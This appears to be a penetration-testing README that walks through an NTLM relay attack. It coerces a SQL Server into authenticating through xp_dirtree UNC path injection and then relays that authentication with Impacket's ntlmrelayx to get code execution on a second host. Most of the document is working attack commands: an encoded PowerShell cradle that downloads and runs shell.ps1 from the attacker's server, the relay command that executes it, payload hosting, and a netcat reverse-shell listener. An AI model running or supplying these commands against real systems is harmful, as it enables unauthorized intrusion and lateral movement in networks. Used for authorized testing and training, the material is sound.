# 🎯 UNC Path Injection & NTLM Relay Attack with Impacket

This repository demonstrates a powerful internal network attack technique where we force a victim host to authenticate to a malicious SMB server and relay that NTLM authentication to a second system for **remote code execution**, all **without cracking the hash**.

This method is ideal in environments where:
- A **shared service account** is used on multiple systems.
- **SMB signing is disabled** on the relay target.
- AppLocker or other controls block direct binary execution.

---

## 📌 Objective

Relay a captured **Net-NTLM hash** from a machine (e.g. DC or SQL Server) to another host where the user has **local admin rights**, and gain **code execution** via `ntlmrelayx`.

---

## ⚙️ Environment Setup

- Attacker Machine: Kali Linux
- Victim 1: SQL Server with a service account (e.g. `SQLSVC`)
- Victim 2: Another internal system (e.g. `appsrv01`) where `SQLSVC` is local administrator
- SMB signing is **disabled** on the second target
- Ligolo proxy or reverse shell server is listening

---

## 🔐 UNC Relay Attack

### 1. Base64-encode the PowerShell download cradle

```bash
echo -n "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.100/shell.ps1')" | iconv -t utf-16le | base64 -w 0; echo
```
- Change the IP at the shell.ps1 file.

**Output:**
```
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANgA0AC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==
```

---

### 2. Launch `ntlmrelayx` to relay the hash and execute the command

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.206.151 -c 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANgA0AC8AcwBoAGUAbABsAC4AcABzADEAJwApAA=='
```

- `--no-http-server`: disables automatic HTTP listener since we serve our own shell script.
- `-smb2support`: required for modern Windows hosts (SMBv2+).
- `-t`: the target machine where code execution will happen.
- `-c`: command to execute on the target (reverse shell loader).

---

### 3. Host your reverse shell payload (`shell.ps1`)

```bash
python3 -m http.server 80
```

Make sure `shell.ps1` contains your PowerShell reverse shell or loader.

---

### 4. Trigger the authentication from victim SQL host

Use the classic **UNC Path Injection** via MSSQL:

```sql
EXEC master..xp_dirtree '\\192.168.1.94\test'
```

This will cause the SQL Server to connect to your SMB listener, and **ntlmrelayx will relay the authentication** to the second machine (`appsrv01`) and execute the reverse shell.

---
### 4. Start a listener for the reverse shell

```bash
rlwrap -cAr nc -lnvp 443

```

---

## 🧠 Notes

- This technique **does not require cracking the Net-NTLM hash**.
- It works only if:
  - The relayed user is **admin** on the target.
  - **SMB signing is disabled** on the target.
- The command being relayed (`-c`) can be anything the user is authorized to run (PowerShell, HTA, etc.)

---

## ⚠️ Disclaimer

This technique is provided **for educational and authorized testing only**. Do not attempt this attack outside a controlled environment where you have explicit permission to do so.

---


